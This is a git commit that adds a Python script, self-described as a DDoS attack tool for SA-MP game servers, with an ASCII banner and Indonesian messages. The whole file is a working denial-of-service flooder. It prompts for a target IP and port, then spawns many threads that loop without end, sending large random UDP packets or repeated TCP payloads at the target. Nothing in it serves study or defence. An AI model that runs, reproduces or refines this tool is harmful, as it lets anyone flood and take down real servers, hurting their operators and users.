eab79790e81e3104d7f5ed21db673769eb3faec2
pudidiha3mrx <91170250+pudidiha3mrx@users.noreply.github.com>
2021-09-28 13:05:16 +0700

    Create jeje.py

---
+++ jeje.py
@@ -0,0 +1,63 @@
+#!/usr/bin/env python3
+#Code by MR.DANI
+#REMAKE BY JEJE
+import random
+import socket
+import threading
+import sys
+import os
+from os import system, name
+
+os.system("clear")
+print("\033[31m =========================================================================")
+print("\033[31m                                    » TOOLS BY REMAKE BY JEJE X MR DAANI«                              ")
+print("\033[31m =========================================================================")
+print("\033[31m ███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
+print("\033[31m ████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
+print("\033[31m ██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
+print("\033[31m ██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║")
+print("\033[31m ██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║")
+print("\033[31m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝")
+print("\033[31m »DDOS ATTACK FOR SAMP")
+print("\033[31m »Script Ini Dibuat Hanya Untuk Team Mr.Dani")
+print("=================================================================================")
+ip = str(input(" HOST/IP:"))
+port = int(input(" PORT:"))
+choice = str(input(" SIAP UNTUK DDOS(y/n):"))
+times = int(input(" PACKETS:"))
+threads = int(input(" ISI PACKETS:"))
+def run():
+	data = random._urandom(50000)
+	i = random.choice(("[!]","[*]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" | Tok Tok Tok Packed Dari MR.DANI Otw |")
+		except:
+			print("[!] | Server Down!!!! |")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[!]","[*]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Paket Dari Mr.Dani")
+		except:
+			s.close()
+			print("[*] Error kontol")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
